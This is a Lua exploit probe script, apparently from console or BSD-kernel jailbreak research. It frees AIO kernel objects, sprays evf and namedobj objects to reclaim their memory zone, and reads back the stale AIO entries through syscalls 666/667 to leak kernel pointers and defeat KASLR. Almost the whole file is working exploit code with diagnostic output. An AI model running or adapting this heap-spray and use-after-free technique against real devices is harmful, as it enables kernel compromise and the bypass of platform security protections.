-- CRASH_CLASS: LOW
-- PROBE 73b: evf/namedobj spray + AIO 666/667 readback for KASLR
--
-- Strategy:
-- 1. Submit AIO requests to allocate R-objects (48B in 64B zone)
-- 2. Poll + delete to free R (kernel pointers at R+0x00/R+0x08 survive)
-- 3. Spray evf (538) and namedobj (557) objects to reclaim R's zone slots
-- 4. Query deleted AIO IDs via 666/667 — if the kernel reads from
--    the reclaimed slot, it may return spray-object data or the
--    surviving kernel pointers as "status"
--
-- 666 reads status dword from the AIO entry. If the entry struct was
-- reclaimed by an evf/namedobj, 666 reads the spray object's fields.
--
-- NEVER call 670 (aio_init).

print("=== PROBE 73b: EVF/NAMEDOBJ SPRAY + AIO READBACK ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local pid = N(mk(20)())
print("pid=" .. pid)

local sc_669 = mk(669)
local sc_664 = mk(664)
local sc_662 = mk(662)
local sc_666 = mk(666)
local sc_667 = mk(667)
local sc_538 = mk(538)  -- evf_create
local sc_557 = mk(557)  -- namedobj_create
local sc_558 = mk(558)  -- namedobj_delete
local sc_624 = mk(624)  -- VM op counter
local sc_close = mk(6)

-- Open /dev/zero
local zero_path = put_str("/dev/zero")
local fd_zero = N(mk(5)(uint64(N(zero_path)), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FAIL: /dev/zero"); return end

-- ============================================================
-- [A] Measure sys 624 baseline
-- ============================================================
local function get_624()
    local ok, ret = pcall(function() return sc_624() end)
    return ok and N(ret) or 0
end

local base_624 = get_624()
print("[A] sys 624 baseline=" .. base_624)
print("")

-- ============================================================
-- [B] Submit + poll + delete AIO requests (free R-objects)
-- ============================================================
print("[B] Submit/poll/delete AIO to free R-objects")

local NUM_AIO = 128
local data_buf = memory.alloc(0x100)
local deleted_ids = {}
local freed = 0

for i = 1, NUM_AIO do
    local req = memory.alloc(0x28)
    wd(N(req), 1)              -- cmd = read
    wd(N(req) + 0x04, fd_zero) -- fd
    wq(N(req) + 0x08, uint64(N(data_buf)))
    wq(N(req) + 0x10, uint64(16))
    wq(N(req) + 0x18, uint64(0))

    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)

    pcall(function()
        sc_669(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(id_buf)))
    end)
    local aio_id = rd(N(id_buf)) or 0
    if aio_id == 0 then break end

    -- Poll
    local poll_st = memory.alloc(8); wd(N(poll_st), 0)
    pcall(function() sc_664(uint64(N(id_buf)), uint64(1), uint64(N(poll_st))) end)

    -- Delete
    local del_st = memory.alloc(8); wd(N(del_st), 0)
    pcall(function() sc_662(uint64(N(id_buf)), uint64(1), uint64(N(del_st))) end)
    local ds = rd(N(del_st)) or -1
    if ds == 0 then
        freed = freed + 1
        deleted_ids[#deleted_ids + 1] = aio_id
    end
end

local post_del_624 = get_624()
print(string.format("  freed %d R-objects, 624 delta=%d", freed, post_del_624 - base_624))
print("")

-- ============================================================
-- [C] Record pre-spray 666/667 status for deleted IDs
-- ============================================================
print("[C] Pre-spray: query deleted IDs via 666/667")

local pre_spray = {}
local sample_count = math.min(#deleted_ids, 32)

for i = 1, sample_count do
    local id = deleted_ids[i]
    local id_buf = memory.alloc(8); wd(N(id_buf), id)

    -- 666 query
    local st_666 = memory.alloc(8); wd(N(st_666), 0xDEAD)
    pcall(function() sc_666(uint64(N(id_buf)), uint64(1), uint64(N(st_666))) end)
    local s666 = rd(N(st_666)) or 0xDEAD

    -- 667 query (different output format?)
    local st_667 = memory.alloc(16); wd(N(st_667), 0xBEEF); wd(N(st_667) + 4, 0xBEEF)
    pcall(function() sc_667(uint64(N(id_buf)), uint64(1), uint64(N(st_667))) end)
    local s667_lo = rd(N(st_667)) or 0xBEEF
    local s667_hi = rd(N(st_667) + 4) or 0xBEEF
    local q667 = rq(N(st_667))

    pre_spray[i] = {id = id, s666 = s666, q667 = q667}

    if i <= 4 then
        print(string.format("  id=0x%04X 666=0x%08X 667=%s",
            id, s666, fmt(q667)))
    end
end
print(string.format("  sampled %d IDs", sample_count))
print("")

-- ============================================================
-- [D] Spray evf objects (538)
-- ============================================================
print("[D] Spray evf objects via sys 538")

local EVF_COUNT = 512
local evf_handles = {}
local evf_ok = 0
local pre_evf_624 = get_624()

for i = 1, EVF_COUNT do
    local name = put_str(string.format("e%04d", i))
    local ok, ret = pcall(function()
        return sc_538(uint64(N(name)), uint64(0x100))
    end)
    if ok then
        local rv = N(ret)
        if rv > 0 and rv < 0x80000000 then
            evf_handles[#evf_handles + 1] = rv
            evf_ok = evf_ok + 1
        end
    end
end

local post_evf_624 = get_624()
print(string.format("  created %d evf objects, 624 delta=%d (%.1f per obj)",
    evf_ok, post_evf_624 - pre_evf_624,
    evf_ok > 0 and (post_evf_624 - pre_evf_624) / evf_ok or 0))
print("")

-- ============================================================
-- [E] Spray namedobj objects (557)
-- ============================================================
print("[E] Spray namedobj objects via sys 557")

local NOBJ_COUNT = 512
local nobj_handles = {}
local nobj_ok = 0
local pre_nobj_624 = get_624()

for i = 1, NOBJ_COUNT do
    local name = put_str(string.format("n%04d", i))
    local ok, ret = pcall(function()
        return sc_557(uint64(N(name)))
    end)
    if ok then
        local rv = N(ret)
        if rv > 0 and rv < 0x80000000 then
            nobj_handles[#nobj_handles + 1] = rv
            nobj_ok = nobj_ok + 1
        end
    end
end

local post_nobj_624 = get_624()
print(string.format("  created %d namedobj objects, 624 delta=%d (%.1f per obj)",
    nobj_ok, post_nobj_624 - pre_nobj_624,
    nobj_ok > 0 and (post_nobj_624 - pre_nobj_624) / nobj_ok or 0))
print("")

-- ============================================================
-- [F] Post-spray: query deleted IDs again via 666/667
-- ============================================================
print("[F] Post-spray: query deleted IDs via 666/667 (looking for reclaim)")

local kptr_count = 0
local changed_count = 0

for i = 1, sample_count do
    local id = deleted_ids[i]
    local id_buf = memory.alloc(8); wd(N(id_buf), id)

    -- 666 query
    local st_666 = memory.alloc(8); wd(N(st_666), 0xDEAD)
    pcall(function() sc_666(uint64(N(id_buf)), uint64(1), uint64(N(st_666))) end)
    local s666 = rd(N(st_666)) or 0xDEAD

    -- 667 query with wider buffer
    local st_667 = memory.alloc(64)
    for off = 0, 60, 4 do wd(N(st_667) + off, 0xBEEF0000 + off) end
    pcall(function() sc_667(uint64(N(id_buf)), uint64(1), uint64(N(st_667))) end)
    local q667 = rq(N(st_667))

    -- Compare with pre-spray
    local changed = (s666 ~= pre_spray[i].s666)
    if changed then changed_count = changed_count + 1 end

    -- Check for kernel pointers in any readback
    local s666_h = math.floor(s666 / 0x100) -- upper bits of dword
    local q667_h, q667_l = get_hi_lo(q667)

    local is_kptr = false
    if q667_h >= 0xFFFF8000 and q667_h ~= 0xFFFFFFFF then
        is_kptr = true
        kptr_count = kptr_count + 1
    end

    if changed or is_kptr or i <= 4 then
        local pre_s666 = pre_spray[i].s666
        print(string.format("  id=0x%04X 666: 0x%08X->0x%08X 667=%s%s%s",
            id, pre_s666, s666, fmt(q667),
            changed and " CHANGED" or "",
            is_kptr and " *** KPTR ***" or ""))
    end

    -- Also scan 667 output buffer for wider leaks
    for off = 0, 56, 8 do
        local qv = rq(N(st_667) + off)
        if qv then
            local qvh, qvl = get_hi_lo(qv)
            if qvh >= 0xFFFF8000 and qvh ~= 0xFFFFFFFF then
                local sentinel = (qvl == 0xBEEF0000 + off) or (qvl == 0xBEEF0000 + off + 4)
                if not sentinel then
                    kptr_count = kptr_count + 1
                    print(string.format("  *** KPTR-WIDE *** id=0x%04X off=+0x%02X val=%s",
                        id, off, fmt(qv)))
                end
            end
        end
    end
end

print(string.format("  changed: %d/%d, kernel ptrs: %d", changed_count, sample_count, kptr_count))
print("")

-- ============================================================
-- [G] Cleanup
-- ============================================================
print("[G] Cleanup")

-- Delete namedobj handles
for _, h in ipairs(nobj_handles) do
    pcall(function() sc_558(uint64(h)) end)
end

pcall(function() sc_close(uint64(fd_zero)) end)

print(string.format("  deleted %d namedobj, %d evf handles left (no evf delete call known)",
    #nobj_handles, #evf_handles))
print("")

print("[H] SUMMARY")
print(string.format("  AIO freed:       %d R-objects", freed))
print(string.format("  evf sprayed:     %d", evf_ok))
print(string.format("  namedobj sprayed: %d", nobj_ok))
print(string.format("  666/667 changed: %d/%d", changed_count, sample_count))
print(string.format("  kernel pointers: %d", kptr_count))

if kptr_count > 0 then
    print("*** KASLR DEFEAT VIA SPRAY RECLAIM ***")
elseif changed_count > 0 then
    print("Status changed post-spray — zone reclaim HAPPENING, investigate readback")
else
    print("No changes — 666/667 may validate ID generation, or spray missed the zone")
end

print("")
print("alive=YES")
print("=== PROBE 73b COMPLETE ===")
